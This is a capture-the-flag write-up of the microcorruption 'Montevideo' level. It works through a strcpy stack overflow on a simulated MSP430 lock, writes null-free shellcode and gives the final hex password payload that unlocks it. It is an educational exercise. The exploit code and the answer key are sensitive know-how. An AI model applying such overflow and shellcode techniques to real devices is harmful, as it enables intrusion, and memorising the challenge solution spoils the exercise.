---
title: "microcorruption - montevideo"
date: 2018-03-08T18:12:36+02:00
categories: 
- ctf
- exploit
- assembly
- microcorruption
- montevideo
---

{{< figure src="/images/microcorruption/microcorruption.png" >}}

This post is part of the series of solving [microcorruption.com](https://microcorruption.com) ctf challenges which continues from the [previous challenge](https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/) called _Whitehorse_. This challenge is titled _Montevideo_.

The challenge has the following description when you start:

> This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.

Cool. So this one is going to be unbreakable right? Lets see!
<!--more-->

## montevideo

Montevideo follows a similar code pattern when compared to some of the previous challenges we have done where a simple `main` routine calls `login`. Looking at `login` itself we can see a few new things:

```asm
44f4 <login>

[.. typical getsn call to get the password ..]

; strcpy, thats new!
451a:  b012 dc45      call  #0x45dc <strcpy>
451e:  3d40 6400      mov   #0x64, r13
4522:  0e43           clr   r14
4524:  3f40 0024      mov   #0x2400, r15

; memset is also an interesting one!
4528:  b012 f045      call  #0x45f0 <memset>
452c:  0f41           mov   sp, r15

; probably checks the password again
452e:  b012 4644      call  #0x4446 <conditional_unlock_door>
4532:  0f93           tst   r15

[.. some messages printed to tell if you unlocked or not ..]

4544:  3150 1000      add   #0x10, sp
4548:  3041           ret
```

The calls to `strcpy` and `memset` immediately jumped out at me here. I also figured since there is mention of the password size again the bug here might be related to a stack overflow too. To test this, I threw in like 30 `A`'s into the password field to see if the program breaks.

{{< figure src="/images/microcorruption/montevideo_stack_overflow.png" >}}

> insn address unaligned

Nice! The program counter (`pc`) has `0x4141` which most probably comes from our longer-than-its-supposed-to-be password we supplied. With this bug in mind, I quickly had a look at the other routines to see if there is anything interesting happening there. I set up a total of four breakpoints at the following locations:

- `0x4510` at `getsn`
- `0x451a` at `strcpy`
- `0x4528` at `memset`
- `0x452e` at `conditional_unlock_door`

Inspecting these routines manually, as well as the memory layout after each function had me draw the following conclusions:

- After `getsn` is done, the password buffer lives at `0x2400` in memory.
- Once `strcpy` is done, the password buffer at `0x2400` is copied into a buffer that starts at `0x43ef`.
- After `memset` is done, the password buffer at `0x2400` is zeroed out.
- After `conditional_unlock_door` with a too long password buffer, the stack is corrupt and the return address to `main` overridden.

It seems like this challenge is pretty much exactly the same as previous Whitehorse challenge? The `conditional_unlock_door` routine calls syscall `0x7e`, so with our overflow this is not a useful location to jump to as the "HSM" will validate the password. So, like the previous one, we just need a spot to slide in some shellcode.

Before we can supply the shellcode though, we need to find out where we are overriding and corrupting the stack for that `ret` instruction. For this, I just supplied a bunch of `A`'s and `B`'s and found that at position 17 and 18 again we have control over the programs execution flow.

{{< figure src="/images/microcorruption/monte_video_ret_control.png" >}}

Next, we choose a location in memory where our password buffer is as the address we should jump to (as a result of the `ret`) which should also be the start of our shellcode. I simply copied the unlock shellcode from [Whitehorse](https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/) which was `30127f00b0123245`. The shellcode itself needs a little work though as the address to the `INT` routine would be different here.

To help with the shellcode modifications we need to do, we can use the assembler/dissasembler provided on microcorruption.com [here](https://microcorruption.com/assembler). Grab the opcodes that form part of our shellcode, paste them into the input box and hit disassemble. Now, with the ASM mnemonics in the input box, update the address to `call` to `0x454c` as that is where it lives in this challenge. Finally, hit assemble and be presented with your shellcode :D

{{< figure src="/images/microcorruption/montevideo_shellcode_1.png" >}}

I figured a good spot to jump to our shellcode would be just after the `ret` address at `0x4400`, so, my password payload was now going to be:

```text
# ret is 0x4400, so 0044 little endian

[padding to ret] +  [ret] +    [shellcode]
---------------------------------------------
    41 * 16      +  0044  +  30127f00b0124c45 =

# final password payload
41414141414141414141414141414141004430127f00b0124c45
```

Sending this password payload, and inspecting the program after a breakpoint at `0x4548` left the program in a confusing state.

{{< figure src="/images/microcorruption/montevideo_strcpy_nullbyte.png" >}}

It was clear that the jump to `0x4400` was taken as the program counter (`pc`) was there, but, my shellcode was missing. Well... if you have ever dealt with `strcpy` before, you may have spotted that this was going to happen as soon as I chose `0x4400` as the address to jump to, as that address contains a nullbyte which is a string terminator for `strcpy`. Easy fix really, just move along two bytes to avoid a `0x00` byte. With a two byte shift, our password payload looks something like this:

```text
[padding to ret] +  [ret] +  [pad] + [shellcode]
-----------------------------------------------------
    41 * 16      +  0244  +  4242  + 30127f00b0124c45

414141414141414141414141414141410244424230127f00b0124c45
```

{{< figure src="/images/microcorruption/montevideo_null_byte_shellcode.png" >}}

Snap. We have made a little progress, but there is still a null byte in our shellcode because of the opcodes that form part of the `push #0x7f` instruction which is `3012 7f00`. We need to get rid of the `0x00` byte. We can simply modify the shellcode to use any other instructions that will eventually push the value `0xf7` to the stack. Think of things like moving a large value into a register, performing arithmetic and then moving the resultant register value onto the stack instead of the original value as is.

I used existing instructions in the program as a reference for ideas on how I can modify the shellcode to avoid null bytes. This was the final shellcode I got to work using the disassembler [here](https://microcorruption.com/assembler):

```asm
mov     #0x117e, r9
sub     #0x10ff, r9
push    r9
call    #0x454c
```

First, I took a large 2 byte value of `0x117e` and moved that to `r9`. I then took a calculator and subtracted the desired value of `0x7f` from `0x117e` and got to `0x10ff`. That resulted in my second instruction of `sub #0x10ff, r9` which should leave the value `0x7f` in register `r9`. Finally, just push `r9` onto the stack and call `INT`.

{{< figure src="/images/microcorruption/montevideo_final_shellcode.png" >}}

So now, my final password payload looks as follows:

```python
python -c "print('41' * 16 + '0244' + '4242' + '39407e113980ff100912b0124c45')"
414141414141414141414141414141410244424239407e113980ff100912b0124c45
```

{{< figure src="/images/microcorruption/montevideo_unlock.png" >}}

Works! `r9` ends up as `0x7f`, pushed to the stack and `INT` is called to unlock the lock.

## solution

Enter `414141414141414141414141414141410244424239407e113980ff100912b0124c45` as hex encoded input.

## other challenges

For my other write ups in the microcorruption series, checkout [this](https://leonjza.github.io/categories/microcorruption/) link.
